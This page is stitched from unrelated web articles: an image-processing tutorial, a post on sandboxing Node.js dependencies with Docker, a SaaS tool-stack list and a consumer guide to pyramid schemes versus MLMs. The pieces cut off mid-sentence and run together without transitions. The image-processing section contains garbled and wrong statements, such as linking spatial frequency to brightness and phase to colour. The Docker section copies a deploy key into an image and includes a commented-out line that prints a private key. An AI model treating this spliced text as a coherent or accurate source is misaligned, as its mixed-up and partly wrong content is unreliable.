

<p>An image can be represented as a 2D function F(x,y) where x and y are spatial coordinates. The amplitude of F at a particular value of x,y is known as the intensity of an image at that point. If x,y, and the amplitude value is finite then we call it a digital image. It is an array of pixels arranged in columns and rows. Pixels are the elements of an image that contain information about intensity and color. An image can also be represented in 3D where x,y, and z become spatial coordinates. Pixels are arranged in the form of a matrix. This is known as an <strong>RGB image</strong>.</p>











<p>There are various types of images:</p>



<ul><li>RGB image: It contains three layers of 2D image, these layers are Red, Green, and Blue channels.</li><li>Grayscale image: These images contain shades of black and white and contain only a single channel.</li></ul>






<h2>Classic image processing algorithms</h2>



<h3><strong>1. Morphological Image Processing</strong></h3>



<p>Morphological image processing tries to remove the imperfections from the binary images because binary regions produced by simple thresholding can be distorted by noise. It also helps in smoothing the image using opening and closing operations.</p>



<p>Morphological operations can be extended to grayscale images. It consists of non-linear operations related to the structure of features of an image. It depends on the related ordering of pixels but on their numerical values. This technique analyzes an image using a small template known as <strong>structuring element </strong>which is placed on different possible locations in the image and is compared with the corresponding neighbourhood pixels. A structuring element is a small matrix with 0 and 1 values.</p>



<p>Let’s see the two fundamental operations of morphological image processing, <strong>Dilation and Erosion:</strong></p>



<ul><li><strong>dilation </strong>operation<strong> </strong>adds pixels to the boundaries of the object in an image</li><li><strong>erosion </strong>operation<strong> </strong>removes the pixels from the object boundaries.&nbsp;</li></ul>



<p>The number of pixels removed or added to the original image depends on the size of the structuring element.&nbsp;</p>



<p>At this point you may be thinking “what is a structuring element?” Let me explain:</p>



<p>Structuring element is a matrix consisting of only 0’s and 1’s that can have any arbitrary shape and size. It is positioned at all possible locations in the image and it is compared with the corresponding neighbourhood of pixels.</p>



<div><figure><img loading="lazy" width="688" height="255" src="https://i0.wp.com/neptune.ai/wp-content/uploads/square-structuring.png?resize=688%2C255&amp;ssl=1" alt="square structuring" srcset="https://i0.wp.com/neptune.ai/wp-content/uploads/square-structuring.png?w=688&amp;ssl=1 688w, https://i0.wp.com/neptune.ai/wp-content/uploads/square-structuring.png?resize=300%2C111&amp;ssl=1 300w" sizes="(max-width: 688px) 100vw, 688px" data-recalc-dims="1"></figure></div>

<p>The square structuring element ‘A’ fits in the object we want to select,&nbsp;the ‘B’ intersects the object and ‘C’ is out of the object.</p>



<p>The zero-one pattern defines the configuration of the structuring element. It’s according to the shape of the object we want to select. The center of the structuring element identifies the pixel being processed.</p>

<h3><strong>2.</strong> <strong>Gaussian Image Processing</strong></h3>



<p>Gaussian blur which is also known as gaussian smoothing, is the result of blurring an <strong>image</strong> by a <strong>Gaussian</strong> function.</p>



<p>It is <strong>used to reduce image noise and reduce details</strong>. The visual effect of this blurring technique is similar to looking at an image through the translucent screen. It is sometimes used in computer vision for image enhancement at different scales or as a data augmentation technique in deep learning.</p>



<p>The basic gaussian function looks like:</p>



<div><figure><img loading="lazy" src="https://lh4.googleusercontent.com/srvKqGimVCCB88Tm08WEeNCWu1RNrmtgUQz_NNkbOXQYGFiTMpdP8CpLPniL61cWYmS5csT2eh4qRdVyw1T4qDaPGxQhQ5iMwdTzbNeZNwb9gZBoKL1siyPiCERj7dqkuupPYq8B" alt="" width="312" height="107"></figure></div>



<p>In practice, it is best to take advantage of the Gaussian blur’s separable property by dividing the process into two passes. In the first pass, a one-dimensional kernel is used to blur the image in only the horizontal or vertical direction. In the second pass, the same one-dimensional kernel is used to blur in the remaining direction. The resulting effect is the same as convolving with a two-dimensional kernel in a single pass. Let’s see an example to understand what gaussian filters do to an image.</p>



<p>If we have a filter which is normally distributed, and when its applied to an image, the results look like this:</p>











<p><em><a href="https://www.youtube.com/watch?v=-AuwMJAqjJc" target="_blank" rel="noreferrer noopener nofollow">Source</a></em></p>



<p>You can see that some of the edges have little less detail. The filter is giving more weight to the pixels at the center than the pixels away from the center. Gaussian filters are low-pass filters i.e. weakens the high frequencies. It is commonly <a href="https://www.cs.auckland.ac.nz/courses/compsci373s1c/PatricesLectures/Gaussian%20Filtering_1up.pdf">used in edge detection</a>.</p>






<h3><strong>3. Fourier Transform in image processing</strong></h3>



<p>Fourier transform breaks down an image into sine and cosine components.&nbsp;</p>



<p>It has multiple applications like image reconstruction, image compression, or image filtering.&nbsp;</p>



<p>Since we are talking about images, we will take discrete fourier transform into consideration.</p>



<p>Let’s consider a sinusoid, it comprises of three things:</p>



<ul><li>Magnitude – related to contrast&nbsp;</li><li>Spatial frequency – related to brightness</li><li>Phase – related to color information</li></ul>



<p>The image in the frequency domain looks like this:</p>



<div><figure><img loading="lazy" src="https://i1.wp.com/neptune.ai/wp-content/uploads/fourier-transform.png?resize=564%2C289&amp;ssl=1" alt="fourier" width="564" height="289" srcset="https://i1.wp.com/neptune.ai/wp-content/uploads/fourier-transform.png?w=752&amp;ssl=1 752w, https://i1.wp.com/neptune.ai/wp-content/uploads/fourier-transform.png?resize=300%2C154&amp;ssl=1 300w" sizes="(max-width: 564px) 100vw, 564px" data-recalc-dims="1"></figure></div>

<h3><strong>4. Edge Detection in image processing</strong></h3>



<p>Edge detection is an image processing technique for finding the boundaries of objects within images. It works by detecting discontinuities in brightness.</p>



<p>This could be very beneficial in extracting useful information from the image because most of the shape information is enclosed in the edges. Classic edge detection methods work by detecting discontinuities in the brightness.&nbsp;</p>



<p>It can rapidly react if some noise is detected in the image while detecting the variations of grey levels. Edges are defined as the local maxima of the gradient.&nbsp;</p>



<p>The most common edge detection algorithm is <strong>sobel edge detection algorithm</strong>. Sobel detection operator is made up of 3*3 convolutional kernels. A simple kernel Gx and a 90 degree rotated kernel Gy. Separate measurements are made by applying both the kernel separately to the image.</p>

<h3><strong>5. Wavelet Image Processing</strong></h3>



<p>We saw a Fourier transform but it is only limited to the frequency. Wavelets take both time and frequency into the consideration. This transform is apt for non-stationary signals.&nbsp;</p>



<p>We know that edges are one of the important parts of the image, while applying the traditional filters it’s been noticed that noise gets removed but image gets blurry. The wavelet transform is designed in such a way that we get good frequency resolution for low frequency components. Below is the 2D wavelet transform example:</p>

<h2>Image processing using Neural Networks</h2>



<p>Neural Networks are multi-layered networks consisting of neurons or nodes. These neurons are the core processing units of the neural network. They are designed to act like human brains. They take in data, train themselves to recognize the patterns in the data and then predict the output.</p>



<p>A basic neural network has three layers:</p>



<ol><li>Input layer</li><li>Hidden layer</li><li>Output layer</li></ol>

<p><em>Basic neural network | <a href="https://www.wandb.com/articles/fundamentals-of-neural-networks" target="_blank" rel="noreferrer noopener nofollow">Source</a></em></p>



<p>The input layers receive the input, the output layer predicts the output and the hidden layers do most of the calculations. The number of hidden layers can be modified according to the requirements. There should be atleast one hidden layer in a neural network.</p>



<p>The basic working of the neural network is as follows:</p>



<ol><li>Let’s consider an image, each pixel is fed as input to each neuron of the first layer, neurons of one layer are connected to neurons of the next layer through channels.&nbsp;</li><li>Each of these channels is assigned a numerical value known as weight.&nbsp;</li><li>The inputs are multiplied by the corresponding weights and this weighted sum is then fed as input to the hidden layers.&nbsp;</li><li>The output from the hidden layers is passed through an activation function which will determine whether the particular neuron will be activated or not.&nbsp;</li><li>The activated neurons transmits data to the next hidden layers. In this manner, data is propagated through the network, this is known as Forward Propagation.&nbsp;</li><li>In the output layer, the neuron with the highest value predicts the output. These outputs are the probability values.</li><li>The predicted output is compared with the actual output to obtain the error. This information is then transferred back through the network, the process is known as Backpropagation.</li><li>Based on this information, the weights are adjusted. This cycle of forward and backward propagation is done several times on multiple inputs until the network predicts the output correctly in most of the cases.</li><li>This ends the training process of the neural network. The time taken to train the neural network may get high in some cases.</li></ol>

  A very important aspect of security lies in reducing the attack surface something that you'd like to keep safe. While
  I love Node.js, the ecosystem has given rise to thousands of modules each of which increases the chances of malicious
  code sneaking in. Examples of such code include (but are not limited to) stealing your private SSH keys, browser
  password files, environment variables and much more. In this article, we will look a how we can build a secure Node.js
  development environment via docker containers.
</p>

<p>
  Let us a pick a very basic web application that requires a database and see how we can dockerize it. Let us first
  start with the <code>docker-compose.yml</code> which resides in our project root and contains the top-level
  configuration for our containers:
</p>

<pre>version: "3.3"
services:
  db:
    image: mysql:5.7
    restart: unless-stopped
    environment:
      MYSQL_DATABASE: "dockerize-it-sample"
      # So you don't have to use root, but you can if you like
      MYSQL_USER: "dockerize-it-sample"
      # You can use whatever password you like
      MYSQL_PASSWORD: "dockerize-it-sample"
      # Password for root access
      MYSQL_ROOT_PASSWORD: "dockerize-it-sample"
    ports:
      - "3306:3306"
    expose:
      - "3306"
    networks:
      - dockerize-it-sample-network
    volumes:
      - dockerize-it-sample-db:/var/lib/mysql
      
  app:
    build:
      context: .
      dockerfile: Dockerfile
    image: dockerize-it-sample
    container_name: dockerize-it-sample
    restart: unless-stopped
    environment:
      - DB_HOST=db
      - DB_PORT=3306
    ports:
      - "8080:8080"
    networks:
      - dockerize-it-sample-network
    volumes:
      - .:/home/node/app
      - node_modules:/home/node/app/node_modules
      - /home/node/app/.git
    depends_on:
      - db
    command: npm run start

networks:
  dockerize-it-sample-network:
    driver: bridge

volumes:
  dockerize-it-sample-db:
  node_modules:
</pre>

<p>
  So we're using docker-compose (1.25.0) with docker (19.03.12) to spin up 2 containers, one of them being a database
  with the second one being our application container.
</p>

<h5>Api container</h5>

<p>
  The app container depends on the database and essentially copies all the contents of the project directory into the
  container but hides the dreaded <code>node_modules</code> folder. Moreover, we also hide the version control folder,
  <code>.git</code>. We pass the hostname for the database via an environment variable and setup both containers on the
  same network. Assuming that this is some sort of a web application running on port 8080, we expose it so that we can
  access the running application via the <code>localhost</code>. Finally, we tell the container to execute
  <code>npm run start</code> when it starts. Let us now look at the <code>Dockerfile</code> which defines how the api
  container is created:
</p>

<pre>FROM node:12-alpine

RUN apk add --no-cache git

RUN mkdir -p /home/node/app/node_modules &amp;&amp; chown -R node:node /home/node/app

WORKDIR /home/node/app

COPY package*.json ./

USER node

RUN npm install

COPY --chown=node:node . .
</pre>

<p>
  Creating the api container is fairly straightforward, we use a standard Node.js docker image and then install git in
  case we need to install from a non-npm repository. We thereafter create a local <code>app</code> folder under the
  <code>node</code> user and copy the <code>package.json</code> and the <code>package-lock.json</code> files into it. We
  then install the dependencies locally within the container. Finally we make sure that the local user owns all the
  files. As an added level of precaution we can also ignore certain items from getting copied into the container via a
  <code>.dockerignore</code> file:
</p>

<pre>node_modules
npm-debug.log

Dockerfile*
docker-compose*
.dockerignore

.git*

data-*/
.vscode/
</pre>

<p>
  Predictably, this file functions as a <code>.gitignore</code> file and we skip copying over
  <code>node_modules</code> (just in case we might have have installed something locally as well). Note that since we
  will be mounting the current directory into the app container anything that is not specifically excluded by creating
  an overlay mount point will be exposed to the application!
</p>

<h5>Database container</h5>

<p>
  Coming back the <code>docker-compose.yml</code> file, the database container uses a standard MySQL image and the only
  special thing about it is that we expose the MySQL port (3306) so that we can connect to the database from our local
  machine. We also set up a named volume (<code>dockerize-it-sample-db</code>) so that our data is persisted across
  container restarts.
</p>

<h5>Running the containers</h5>

<p>
  Executing <code>docker-compose build</code> should build all containers and we can always run
  <code>docker-compose build --no-cache</code> to force building all the containers from scratch. Note that this can
  lead to a lot of intermediate containers lying about and these can likely be cleaned via a
  <code>docker system prune</code> command. Running <code>docker-compose up</code> will fire up both containers and we
  should be able to make code changes locally.
</p>

<h5>Why do this?</h5>

<p>
  So now that we have dockerized everything, how does it actually help? The idea behind this exercise was that the
  application dependencies should be installed in a barebones container that does not provide any access to the local
  development environment. Moreover, the actual code is on the local machine and one can use their preferred method of
  development with only the execution of the code being outsourced to the container. A normal workflow such as
  hot-reloading code, etc. should all work out of the box. If you'd like to run tests that require an execution
  environment you can jump into the container itself and run commands directly:
  <code>docker exec -it dockerize-it-sample /bin/sh</code>.
</p>

<h5>Gotchas</h5>

<p>
  Note that I've had some issues with typescript development where I've needed to install type definitions locally. This
  can be achieved via:
  <code>npm i --no-package-lock --no-save @types/supertest @types/request @types/mocha @types/chai --ignore-scripts</code>. Note that the lockfile needs to be ignored as npm installs all dependencies if it sees one. Also, we ignore all
  scripts for security which was the point of this exercise.
</p>

<p>
  Another gotcha is the installation of dependencies from private git repositories. These depend on your private SSH key
  and there is unfortunately no easy way to pass sensitive information to non-swarm docker containers (i.e. single node
  local installation). The best that I could come up with was to create a new private key and add it as a deploy key to
  the private repository. This key is then copied over to the container while building and deleted after the the modules
  have been installed. Sample <code>Dockerfile</code>:
</p>

<pre>FROM node:12-alpine

RUN apk add --no-cache git openssh-client

RUN mkdir -p /home/node/app/node_modules &amp;&amp; chown -R node:node /home/node/app

WORKDIR /home/node/app

COPY package*.json ./
COPY --chown=node:node ./docker/private-repo.key ./private-repo.key

USER node

RUN mkdir ~/.ssh 

# only for swarm
# RUN ln -s /run/secrets/host_ssh_key ~/.ssh/id_rsa
# RUN cat ~/.ssh/id_rsa

RUN ssh-keyscan -t rsa private-repo.url &gt;&gt; ~/.ssh/known_hosts
RUN cp ./private-repo.key ~/.ssh/id_ed25519

RUN npm install

COPY --chown=node:node . .

RUN rm ~/.ssh/id_ed25519
RUN rm ./private-repo.key
</pre>

<p>
  As can be noted above, for docker swarm installations one can use the secrets feature which mounts secrets in a
  special volume. While this is not secure as the post install scripts might be able to slurp the contents of
  <code>~/.ssh</code>, we do limit the damage by providing a read-only key.
</p>

<p>
  A practical example can be found here:
  <a href="https://github.com/smalldatatech/dockerize-it-sample">https://github.com/smalldatatech/dockerize-it-sample</a>. This is a web application that runs on 8080 and returns a directory listing of the running user's home directory.
  You can try it out and as always, I am very happy for your feedback.

November 16, 2020 | https://jake.nyc/words/tools-and-services-i-use-to-run-my-saas/ | <a href="https://web.archive.org/web/*/https://jake.nyc/words/tools-and-services-i-use-to-run-my-saas/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Who doesn’t love a good stack teardown? Ever since I saw <a href="https://cushionapp.com/running-costs/">Cushion’s running costs</a> page, I’ve been low key addicted to reading about how other apps are built.</p>
<p>I work on an app called <a href="https://songrender.com/">SongRender</a> that helps musicians and podcasters make videos for social media. So in the spirit of the teardown, here are the tools and services I use to run it!</p>
<h3 id="languages">Languages</h3>
<p>This isn’t an exhaustive list — I’ve omitted some obvious ones (like HTML) and ones that are implied by other tooling choices (like HCL for Terraform).</p>
<ul>
<li><a href="https://www.typescriptlang.org/">TypeScript</a> — A superset of JavaScript with static types. I fell in love with this language when I first tried it a few years ago, and it’s only gotten better since then. I use it for both the frontend and server-side code.</li>
<li><a href="https://sass-lang.com/">SCSS</a> — A superset of CSS with cool features like mixins and nesting. I use it for both the marketing site and — with <a href="https://github.com/css-modules/css-modules">CSS modules</a> — the web app.</li>
</ul>
<h3 id="build-systems-and-frameworks">Build Systems and Frameworks</h3>
<ul>
<li><a href="https://reactjs.org/">React</a> — The frontend is a single-page app built with React, which has been a great choice — it gets out of the way and lets me just work on the app. There might be other frameworks out there that are quote unquote better, but the sheer size of the React community means I basically never run into any uncharted territory.</li>
<li><a href="https://create-react-app.dev/">Create React App</a> — A batteries-included build system for React. The first time I made a React app, I cobbled together the configuration for Webpack/Babel/etc myself. Create React App hides all that — with the option to “eject” and get the full configuration if I ever need to do something it doesn’t support.</li>
<li><a href="https://expressjs.com/">Express</a> — A Node.js server-side framework. Just like with React, I chose it because it’s the most popular by far. As for why I chose Node.js rather than another language, it’s because I need to run the same video rendering code in the browser and on the server.</li>
<li><a href="https://gohugo.io/">Hugo</a> — A fast static site generator written, used to build the marketing site.</li>
</ul>
<h3 id="libraries">Libraries</h3>
<p>This list is also not exhaustive, but there are too many libraries to name them all here, so I’ve tried to keep it to the most notable or interesting ones.</p>
<ul>
<li><a href="https://immerjs.github.io/immer/docs/introduction">immer</a> — An intuitive, performant way to do immutability. It can also serialize patches you make to an object, so it’s fairly easy to implement undo functionality as well.</li>
<li><a href="https://www.downshift-js.com/">downshift</a> — A React library for building accessible dropdowns and multi-selects. Easy to style, and you get accessibility for free.</li>
<li><a href="https://popper.js.org/">popper</a> — A nifty little tooltip positioning library.</li>
<li><a href="https://github.com/Automattic/node-canvas">node-canvas</a> — Node library for using the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API">canvas API</a> on the server.</li>
<li><a href="https://www.ffmpeg.org/">ffmpeg</a> — Swiss army knife audio and video library. I use this to on the server convert audio files to WAV and to combine individual frames into users' videos.</li>
</ul>
<h3 id="infrastructure">Infrastructure</h3>
<ul>
<li><a href="https://www.namecheap.com/">Namecheap</a> — Domain name registrar. Don’t get turned off by the slightly sketchy name — they’re my favorite registrar that I’ve used.</li>
<li><a href="https://www.cloudflare.com/">Cloudflare</a> — Provides DNS, SSL termination and DDOS protection for the websites and API.</li>
<li><a href="https://www.netlify.com/">Netlify</a> — Hosts static files for the app frontend and marketing site. It’s really easy to use and there’s a generous free tier.</li>
<li><a href="https://www.digitalocean.com/">DigitalOcean</a> — Cloud infrastructure provider, but with plain Linux servers rather than proprietary services. I use them for servers, databases, and object storage to host users' file uploads and videos. Their web UI and API are both really easy to use; I never want to go back to AWS. <a href="https://m.do.co/c/e506b6f94e20">💰 Affiliate link</a></li>
<li><a href="https://postmarkapp.com/">Postmark</a> — Transactional email provider. I switched from <a href="https://sendgrid.com/">SendGrid</a> when I exceeded their free tier and couldn’t get in touch with support, and boy am I glad I did. Postmark’s delivery rate is better, and the dashboard is faster and easier to use. If you’re a bootstrapped startup, they’ll give you a <a href="https://postmarkapp.com/for/bootstrapped-startups">$75 credit</a>.</li>
</ul>
<h3 id="databases">Databases</h3>
<ul>
<li><a href="https://www.postgresql.org/">PostgreSQL</a> — Relational database for persisting the app’s data. I briefly considered <a href="https://www.mysql.com/">MySQL</a> as well, but PostgreSQL has a bunch of really nice features like <a href="https://www.postgresql.org/docs/9.5/dml-returning.html">returning data from modified rows</a>. I did not consider non-relational databases like <a href="https://www.mongodb.com/">MongoDB</a>.</li>
<li><a href="https://redis.io/">Redis</a> — Key/value store, only used for a task queue. Usually I would put this part off and just build a monolith, but CPU-intensive video rendering needs its own server.</li>
<li><a href="https://www.influxdata.com/">InfluxDB</a> — Time-series database for storing metrics. See the section on <a href="#monitoring">monitoring</a>.</li>
</ul>
<h3 id="servers">Servers</h3>
<ul>
<li><a href="https://ubuntu.com/">Ubuntu</a> — The Linux distribution that the servers run. Like other parts of the stack, I chose it because it’s one of the most popular.</li>
<li><a href="https://nginx.org/">nginx</a> — A web server and reverse proxy, used here as a load balancer for the API servers.</li>
<li><a href="https://systemd.io/">systemd</a> — A daemon that manages the processes&nbsp;on the server, like Node.js and nginx. <a href="https://pm2.keymetrics.io/">pm2</a> is another popular one, but it’s Node-specific.</li>
</ul>
<h3 id="deploying">Deploying</h3>
<p>I’ve previously written about how I deploy SongRender, so you can <a href="https://jake.nyc/words/bluegreen-deploys-and-immutable-infrastructure-with-terraform/">read about it in more depth</a> if you’re interested. If you just want the high level, these are the tools involved.</p>
<ul>
<li><a href="https://www.terraform.io/">Terraform</a> — An “infrastructure as code” tool, where you describe the infrastructure you want and it diffs with the infrastructure that actually exists. Kind of like React, but for configuration management. I love Terraform, and I use it to manage any infrastructure it supports.</li>
<li><a href="https://www.packer.io/">Packer</a> — A tool for building machine images. This makes it easy to deploy servers with Terraform.</li>
</ul>
<h3 id="monitoring">Monitoring</h3>
<ul>
<li><a href="https://sentry.io/organizations/songrender/issues/">Sentry</a> — Error tracking. Picks up any uncaught exceptions in the client- and server-side code.</li>
<li><a href="https://www.statuscake.com/">Statuscake</a> — Uptime monitoring, making sure the website and API don’t go down. Chosen for its generous free tier.</li>
<li><a href="https://www.papertrail.com/">Papertrail</a> — Log management. It forwards system log messages using <code>rsyslog</code>, so I can just use <code>console.log</code> in my server-side code and have it picked up. At some point I might try to switch to a service that supports structured logs, like <a href="https://timber.io/">Timber</a>.</li>
<li><a href="https://www.influxdata.com/time-series-platform/telegraf/">Telegraf</a> — Agent that collects metrics from the servers and forwards them to InfluxDB. It makes it very easy to get metrics on CPU/memory/etc without paying an arm and a leg for something like <a href="https://www.datadoghq.com/">Datadog</a>.</li>
<li><a href="https://grafana.com/">Grafana</a> — Metrics dashboard that displays data from InfluxDB and PostgreSQL. It’s easy to set up and use, and its visualizations are pretty.</li>
</ul>
<h3 id="analytics">Analytics</h3>
<ul>
<li><a href="https://www.indicative.com/">Indicative</a> — App analytics. I was using <a href="https://mixpanel.com/">Mixpanel</a>, but I ended up exceeding their free tier — which was a shame, because I liked them a lot more. Might check out <a href="https://amplitude.com/">Amplitude</a> when I have time.</li>
<li><a href="https://usefathom.com/">Fathom</a> — Website visitor stats for the marketing page and app. It’s simpler than Google Analytics and only $15 per month for small sites. <a href="https://usefathom.com/ref/WBX5G9">💰 Affiliate link</a></li>
<li><a href="https://search.google.com/search-console/about">Google Search console</a> — Analytics about Google searches for which SongRender has shown up in the results.</li>
</ul>
<h3 id="payments">Payments</h3>
<ul>
<li><a href="https://stripe.com/">Stripe</a> — Credit card processing and subscriptions. I <strong>love</strong> using Stripe. Their APIs are so well thought-out, the developer tooling is great and their documentation and dashboard are beautiful and easy to use. Their support is also responsive and helpful. I had such a positive experience with them that I registered SongRender LLC with Stripe Atlas, even though it cost a bit more than doing it manually.</li>
<li><a href="https://www.paypal.com/">PayPal</a> — Additional payment option. As happy as I am with Stripe, I’m that unhappy with PayPal: their tooling is lackluster, their documentation is not comprehensive and their website is slow. It’s also clearly not meant as a payment option for in-app purchases — for example, if you’re a new merchant, they’ll hold payments for a few weeks unless you upload a shipping label, which I obviously can’t do. People seem to like having it as a payment option, though.</li>
<li><a href="https://mercury.com/">Mercury</a> — My business bank. One of the three options Stripe recommended as part of Atlas.</li>
</ul>
<h3 id="design">Design</h3>
<ul>
<li><a href="https://www.sketch.com/">Sketch</a> — Vector graphics editor. I designed the SongRender logo using this, and I touch up icons with it too. I tend to go back and forth between this and <a href="https://www.figma.com/">Figma</a>, which I also really like — but there’s still an appeal to using a <a href="https://www.sketch.com/blog/2020/10/26/part-of-your-world-why-we-re-proud-to-build-a-truly-native-mac-app/">native app</a> that doesn’t store all my data in the nebulous cloud.</li>
<li><a href="https://nucleoapp.com/">Nucleo</a> — Library of SVG icons. I bought the lifetime package years ago and have used it in basically every project since. <a href="https://nucleoapp.com/?ref=427">💰 Affiliate link</a></li>
<li><a href="https://jakearchibald.github.io/svgomg/">SVGOMG</a> — Nifty web app that cleans up and compresses SVGs. It’s basically a frontend for <a href="https://github.com/svg/svgo">SVGO</a>.</li>
<li><a href="https://squoosh.app/">squoosh</a> — Nitfy web app that compresses PNGs and JPGs; the raster image counterpart to SVGOMG.</li>
</ul>
<h3 id="development">Development</h3>
<ul>
<li><a href="https://code.visualstudio.com/">VS Code</a> — Not quite a text editor, not quite an IDE. Probably the best Electron app I’ve ever used. I keep checking out <a href="https://nova.app/">Nova</a> out of a love for all things Panic, but it’s not quite there yet.</li>
<li><a href="https://postgresapp.com/">Postgres.app</a> — Simple free local PostgreSQL server for macOS.</li>
<li><a href="https://github.com/amacneil/dbmate">dbmate</a> — Language- and database-agnostic migration tool.</li>
<li><a href="https://gitlab.com/">Gitlab</a> — Source code hosting and versioning.</li>
<li><a href="https://prettier.io/">Prettier</a> — Code formatter for JavaScript, HTML and CSS. If you’ve never used a code formatter before, do it now. It’ll change your life.</li>
<li><a href="https://jestjs.io/">Jest</a> — Test runner for JavaScript. Bundled with Create React App.</li>
<li><a href="https://yarnpkg.com/">Yarn</a> — Alternative package manager for Node.</li>
<li><a href="https://en.wikipedia.org/wiki/Make_(software)">Make</a> — SongRender doesn’t need to be compiled, so this is just a task runner. <a href="https://www.thapaliya.com/en/writings/well-documented-makefiles/">Self-documenting Makefile snippets</a> are super helpful.</li>
</ul>
<h3 id="debugging">Debugging</h3>
<ul>
<li><a href="https://eggerapps.at/postico/">Postico</a> — Great indie Mac app for querying Postgres databases.</li>
<li><a href="https://insomnia.rest/">Insomnia</a> — HTTP client. I use this sometimes when I’m working on the API and don’t want to worry about the browser. I also use it as a very crude admin dashboard: the API has a few admin endpoints for things like retrying a failed render, which I hit directly from Insomnia. <a href="https://paw.cloud/">Paw</a> is a non-Electron alternative that I’ll spend the $50 on at some point.</li>
<li><a href="https://www.panic.com/transmit/">Transmit</a> — File transfer app. I use this whenever I need to poke around object storage, since it’s much easier than using DigitalOcean’s web-based file browser.</li>
</ul>
<h3 id="support">Support</h3>
<ul>
<li><a href="https://crisp.chat/">Crisp</a> — In-app support chat. It’s the slickest, least obtrusive one I could find with a free tier. I’d like to switch to <a href="https://www.intercom.com/">Intercom</a> but can’t justify the cost.</li>
</ul>
<h3 id="organization">Organization</h3>
<ul>
<li><a href="https://trello.com/">Trello</a> — A kanban board for keeping track of bugs and features. A killer feature for me is the ability to add checklists to cards. Before I deploy a feature, I make an exhaustive checklist of cases to test. I’ve caught so many bugs this way; checklists should be a crucial tool in any developer’s QA arsenal. <a href="https://blog.nuclino.com/the-simple-genius-of-checklists-from-b-17-to-the-apollo-missions">Checklists work</a>! <a href="https://trello.com/jakelazaroff/recommend">💰 Affiliate link</a></li>
<li><a href="https://www.notion.so/">Notion</a> — A repository for less structured note-taking.</li>
<li><a href="https://www.fastmail.com/">Fastmail</a> — The email provider I use <a href="https://jake.nyc/words/giving-up-google">instead of Gmail</a>. <a href="https://ref.fm/u20086848">💰 Affiliate link</a></li>
</ul>
<h3 id="marketing">Marketing</h3>
<ul>
<li><a href="https://flyingmeat.com/acorn/">Acorn</a> — Raster&nbsp;image editor. I mostly use it as a lightweight Photoshop alternative when I need to tweak screenshots.</li>
<li><a href="https://ia.net/writer">iA Writer</a> — Markdown …</li></ul></div></div>

<p><span>Maybe it came via email, or a direct message on social media. But the message is always the same: “I’ve found a great opportunity to make money, and I can get you in, too.”</span></p>
<p><span>Now, in the social media age, most of us know that </span><a href="https://fairshake.com/consumer-news/10-million-women-pitched-by-mlms/"><span>being approached with a message like that</span></a><span> usually means that someone wants us to join their multi level marketing scheme, or MLM. But what many people </span><i><span>don’t</span></i><span> know is that the message could mean something more sinister: That you’re being recruited for an illegal pyramid scheme.</span></p>
<p><span>Many people refer to MLMs as pyramid schemes, and there’s a lot of confusion online about the difference between the two. So how do you know if that friend or family member is approaching you with a legitimate business opportunity, an outright scam, or something that lives in the gray area in between those two options?</span></p>

It’s no wonder —&nbsp;they have a lot of traits in common.</span></p>
<p><span>According to the Federal Trade Commission, a </span><b>pyramid scheme</b><span> is a scam that can look a lot like a legitimate business opportunity or an MLM, but the main difference is that pyramid schemes are set up to keep a constant flow of new recruits (and their money) coming into the business. Because of this, participants will often be heavily encouraged to recruit others (often their friends or family) to join.&nbsp;</span></p>
<p><span>There’s a common misconception that if you’re asked to buy or sell a product, it’s not a pyramid scheme, but that isn’t true —&nbsp;pyramid scheme members are often asked to pay fees or consistently buy small amounts of product to keep their standing in the scheme, even if they still have a large amount of inventory they’ve been unable to sell.&nbsp;</span></p>
<p><span>A </span><b>multi level marketing scheme</b><span>, on the other hand, is not illegal. MLM companies sell products or services, and </span><a href="https://fairshake.com/consumer-news/the-mlm-epidemic-in-13-jaw-dropping-maps-2019-11-8/"><span>recruit salespeople</span></a><span> to market and sell them directly to their friends, families, and networks. MLM participants are usually referred to as “distributors,” “participants,” or “contractors,” and they are </span><b>not</b><span> employed by the MLM company —&nbsp;they work as independent contractors.</span></p>
<p><span>Participants in MLMs often also struggle to sell enough products to clear their inventory or reach sales goals that will earn them advertised rewards. But according to the FTC, what sets an MLM apart from a pyramid scheme is that, in an MLM, the company will pay its participants </span><i><span>just</span></i><span> for selling products, and while recruiting new members might help them earn more money, it’s not a requirement for membership.</span></p>
<p><span>We’ll go into more detail below about how to recognize a pyramid scheme or MLM, what red flags to look out for, and how to protect yourself from scams and bad business opportunities.</span></p>
<h2><span>How to Recognize a Pyramid Scheme</span></h2>

Luckily, the FTC provides a list on its website of possible warning signs.</span></p>
<p><b>If promoters make extravagant promises about how much money you can earn</b><span>, it might be a pyramid scheme. Whether it’s a pyramid scheme or MLM, your earning potential can be limited by many factors outside of your control, and anyone promising you’ll earn a certain amount is not being truthful.</span></p>
<p><b>If promoters use high-pressure sales tactics to get you to join</b><span>, it might be a pyramid scheme. Often, they’ll play on your emotions (“You’d be a bad dad if you didn’t take advantage of this opportunity to support your family”) or create a false sense of urgency (“This deal will be off the table if you don’t join today”). These kinds of tactics are employed to get people to join without taking the time to research the company. A legitimate business opportunity won’t require you to make any hasty decisions.</span></p>
<p><b>If participants buy more products than they can use or sell, </b><span>it might be a pyramid scheme. Participants will be required to buy a certain amount to stay “active” in the organization, and so even if they already have an excess of inventory, they’ll be forced to buy more. If you see this happening, it’s a major red flag.</span></p>
<h3><span>What To Do If You Encounter a Pyramid Scheme</span></h3>
<p><span>If you ever encounter what you suspect to be a pyramid scheme (even if you aren’t 100 percent sure), you can report it to the FTC so they can investigate.</span></p>
<p><span>FTC reports can be made online at </span><a href="https://www.ftccomplaintassistant.gov/#crnt&amp;panel1-1"><span>ftccomplaintassistant.gov</span></a><span>. Click “Education, Jobs, and Making Money,” and then select the option to submit a report about “Multi Level Marketing or Pyramid Schemes.” You’ll be taken to a series of forms where you can include all the details you know, so the FTC can decide whether it needs to launch a formal investigation.</span></p>
<p><span>Note that the FTC won’t help you resolve an individual dispute, so if you’re looking to get money back after being recruited into a pyramid scheme, this avenue might not help you. But you have options for that, which we’ll explore more below.</span></p>
<h2><span>How to Recognize Multi Level Marketing (MLM)</span></h2>
<p><span>The main difference that distinguishes multi level marketing (also called MLM or direct sales) is that members of an MLM won’t be strictly </span><i><span>required</span></i><span> to recruit new members in order to get paid. They should be paid for selling the company’s products or services, regardless of whether or not they recruit.&nbsp;</span></p>
<h3><span>How MLM Participants Make Money</span></h3>
<p><span>Often, MLMs are set up so participants receive a commission from the products they sell themselves, and then, often a smaller commission from the products sold by participants they’ve recruited (called their downline).&nbsp;</span></p>
